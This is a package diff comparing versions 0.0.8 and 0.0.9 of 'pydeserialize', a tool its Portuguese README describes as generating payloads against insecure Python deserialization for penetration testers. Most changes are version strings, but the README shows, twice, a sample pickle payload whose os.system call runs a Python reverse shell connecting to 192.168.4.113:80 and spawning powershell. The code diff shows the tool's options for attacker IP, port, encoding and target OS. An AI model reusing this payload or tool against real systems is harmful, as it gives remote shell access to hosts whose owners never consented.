# Comparing `tmp/pydeserialize-0.0.8.tar.gz` & `tmp/pydeserialize-0.0.9.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "pydeserialize-0.0.8.tar", last modified: Fri May 26 16:00:46 2023, max compression
+gzip compressed data, was "pydeserialize-0.0.9.tar", max compression
```

## Comparing `pydeserialize-0.0.8.tar` & `pydeserialize-0.0.9.tar`

### file list

```diff
@@ -1,21 +1,8 @@
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-26 16:00:46.322910 pydeserialize-0.0.8/
--rw-r--r--   0 runner    (1001) docker     (123)     1078 2023-05-26 16:00:33.000000 pydeserialize-0.0.8/LICENSE
--rw-r--r--   0 runner    (1001) docker     (123)     4195 2023-05-26 16:00:46.318910 pydeserialize-0.0.8/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)     2878 2023-05-26 16:00:33.000000 pydeserialize-0.0.8/README.md
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-26 16:00:46.318910 pydeserialize-0.0.8/pydeserialize/
--rw-r--r--   0 runner    (1001) docker     (123)       41 2023-05-26 16:00:33.000000 pydeserialize-0.0.8/pydeserialize/__init__.py
--rw-r--r--   0 runner    (1001) docker     (123)       86 2023-05-26 16:00:33.000000 pydeserialize-0.0.8/pydeserialize/__main__.py
--rw-r--r--   0 runner    (1001) docker     (123)      335 2023-05-26 16:00:33.000000 pydeserialize-0.0.8/pydeserialize/__meta__.py
--rw-r--r--   0 runner    (1001) docker     (123)      419 2023-05-26 16:00:33.000000 pydeserialize-0.0.8/pydeserialize/encoded.py
--rw-r--r--   0 runner    (1001) docker     (123)     1655 2023-05-26 16:00:33.000000 pydeserialize-0.0.8/pydeserialize/pydeserialize.py
--rw-r--r--   0 runner    (1001) docker     (123)     1449 2023-05-26 16:00:33.000000 pydeserialize-0.0.8/pydeserialize/run.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-26 16:00:46.318910 pydeserialize-0.0.8/pydeserialize.egg-info/
--rw-r--r--   0 runner    (1001) docker     (123)     4195 2023-05-26 16:00:46.000000 pydeserialize-0.0.8/pydeserialize.egg-info/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)      441 2023-05-26 16:00:46.000000 pydeserialize-0.0.8/pydeserialize.egg-info/SOURCES.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-05-26 16:00:46.000000 pydeserialize-0.0.8/pydeserialize.egg-info/dependency_links.txt
--rw-r--r--   0 runner    (1001) docker     (123)       73 2023-05-26 16:00:46.000000 pydeserialize-0.0.8/pydeserialize.egg-info/entry_points.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-05-26 16:00:46.000000 pydeserialize-0.0.8/pydeserialize.egg-info/not-zip-safe
--rw-r--r--   0 runner    (1001) docker     (123)       10 2023-05-26 16:00:46.000000 pydeserialize-0.0.8/pydeserialize.egg-info/requires.txt
--rw-r--r--   0 runner    (1001) docker     (123)       14 2023-05-26 16:00:46.000000 pydeserialize-0.0.8/pydeserialize.egg-info/top_level.txt
--rw-r--r--   0 runner    (1001) docker     (123)       38 2023-05-26 16:00:46.322910 pydeserialize-0.0.8/setup.cfg
--rw-r--r--   0 runner    (1001) docker     (123)     2171 2023-05-26 16:00:33.000000 pydeserialize-0.0.8/setup.py
+-rw-r--r--   0        0        0     1078 2023-07-29 16:25:13.710287 pydeserialize-0.0.9/LICENSE
+-rw-r--r--   0        0        0     2878 2023-07-29 16:25:13.710287 pydeserialize-0.0.9/README.md
+-rw-r--r--   0        0        0       41 2023-07-29 16:25:13.710287 pydeserialize-0.0.9/pydeserialize/__init__.py
+-rw-r--r--   0        0        0      419 2023-07-29 16:25:13.710287 pydeserialize-0.0.9/pydeserialize/encoded.py
+-rw-r--r--   0        0        0     1664 2023-07-29 16:25:13.710287 pydeserialize-0.0.9/pydeserialize/pydeserialize.py
+-rw-r--r--   0        0        0     1449 2023-07-29 16:25:13.710287 pydeserialize-0.0.9/pydeserialize/run.py
+-rw-r--r--   0        0        0      489 2023-07-29 16:25:13.710287 pydeserialize-0.0.9/pyproject.toml
+-rw-r--r--   0        0        0     3366 1970-01-01 00:00:00.000000 pydeserialize-0.0.9/PKG-INFO
```

### Comparing `pydeserialize-0.0.8/LICENSE` & `pydeserialize-0.0.9/LICENSE`

 * *Files identical despite different names*

### Comparing `pydeserialize-0.0.8/README.md` & `pydeserialize-0.0.9/README.md`

 * *Files 2% similar despite different names*

```diff
@@ -34,15 +34,15 @@
 Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
 ```yaml
            _                 _     _ _         
  ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ 
 | . | | | . | -_|_ -| -_|  _| | .'| | |- _| -_|
 |  _|_  |___|___|___|___|_| |_|__,|_|_|___|___|
 |_| |___|  
-     v0.0.8 - @joaoviictorti
+     v0.0.9 - @joaoviictorti
 
 options:
   -h, --help            show this help message and exit
   -ip IP                Insert ip
   -p PORT               Insert port
   -e {b64,shell,urlencode,hex} Insert encoding
   -o {Windows,Linux}    Insert operational system
@@ -62,13 +62,13 @@
 pydeserialize -ip 192.168.4.113 -p 80 -o Windows -e shell
 
            _                 _     _ _         
  ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ 
 | . | | | . | -_|_ -| -_|  _| | .'| | |- _| -_|
 |  _|_  |___|___|___|___|_| |_|__,|_|_|___|___|
 |_| |___|  
-     v0.0.8 - @joaoviictorti
+     v0.0.9 - @joaoviictorti
 
 b'\x80\x04\x95\xf9\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\xe1python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.4.113",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("powershell")\'\x94\x85\x94R\x94.'
 ```
 
 <img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
```

#### html2text {}

```diff
@@ -14,22 +14,22 @@
 encodes, mantive um modelo consistentemente passivo para tornÃ¡-lo Ãºtil para
 testadores de penetraÃ§Ã£o. # CaracterÃ­sticas - Gera payloads para explora
 vulnerabilidades de desserializaÃ§Ã£o insegura em python # Forma de
 utilizaÃ§Ã£o ```sh pydeserialize -ip 192.168.4.113 -p 80 -e shell -o Windows
 pydeserialize -ip 192.168.4.113 -e b64 -p 80 -o Linux ``` Isso exibirÃ¡ a ajuda
 para a ferramenta. Aqui estÃ£o todos os switches que ele suporta: ```yaml _ _ _
 _ ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ | . | | | . | -_|_ -| -_| _| |
-.'| | |- _| -_| | _|_ |___|___|___|___|_| |_|__,|_|_|___|___| |_| |___| v0.0.8
+.'| | |- _| -_| | _|_ |___|___|___|___|_| |_|__,|_|_|___|___| |_| |___| v0.0.9
 - @joaoviictorti options: -h, --help show this help message and exit -ip IP
 Insert ip -p PORT Insert port -e {b64,shell,urlencode,hex} Insert encoding -o
 {Windows,Linux} Insert operational system ``` # InstalaÃ§Ã£o pydeserialize
 requer **python3** e para baixÃ¡-lo sÃ³ usar: ```sh pip3 install pydeserialize
 ``` # Executando pydeserialize ```console pydeserialize -ip 192.168.4.113 -p 80
 -o Windows -e shell _ _ _ _ ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ | . |
 | | . | -_|_ -| -_| _| | .'| | |- _| -_| | _|_ |___|___|___|___|_|
-|_|__,|_|_|___|___| |_| |___| v0.0.8 - @joaoviictorti
+|_|__,|_|_|___|___| |_| |___| v0.0.9 - @joaoviictorti
 b'\x80\x04\x95\xf9\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\xe1python
 -c \'import socket,subprocess,os;s=socket.socket
 (socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.4.113",80));os.dup2
 (s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;
 pty.spawn("powershell")\'\x94\x85\x94R\x94.' ``` [https://capsule-
 render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer]
```

### Comparing `pydeserialize-0.0.8/pydeserialize/pydeserialize.py` & `pydeserialize-0.0.9/pydeserialize/pydeserialize.py`

 * *Files 2% similar despite different names*

```diff
@@ -5,20 +5,20 @@
 def banner():
     return """                                                                                                                                                                                                                    
            _                 _     _ _         
  ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ 
 | . | | | . | -_|_ -| -_|  _| | .'| | |- _| -_|
 |  _|_  |___|___|___|___|_| |_|__,|_|_|___|___|
 |_| |___|                                                                                                                                                                            
-     v0.0.8 - @joaoviictorti                                                   
+     v0.0.9 - @joaoviictorti                                                   
 """
 
 def argumentos() -> None:
     
-    parse = argparse.ArgumentParser(prog=banner(),usage="pydeserialize -ip 192.168.4.113 -p 80 -o Windows",formatter_class=RawTextHelpFormatter)
+    parse = argparse.ArgumentParser(prog=banner(),usage="pydeserialize -ip 192.168.4.113 -p 80 -o Windows -e shell",formatter_class=RawTextHelpFormatter)
     parse.add_argument("--version",action="version",version="pydeserialize 0.0.7")
     parse.add_argument("-ip",action="store",type=str,dest="ip",required=True, help="Insert ip")
     parse.add_argument("-p",action="store",type=str,dest="port",required=True, help="Insert port")
     parse.add_argument("-e",action="store",type=str,dest="encode",choices=["b64","shell","urlencode","hex"],default="",required=True,help="Insert encoding")
     parse.add_argument("-o",action="store",type=str,dest="SO",choices=["Windows","Linux"],required=True,help="Insert operational system")
     args = parse.parse_args()
```

### Comparing `pydeserialize-0.0.8/pydeserialize/run.py` & `pydeserialize-0.0.9/pydeserialize/run.py`

 * *Files identical despite different names*

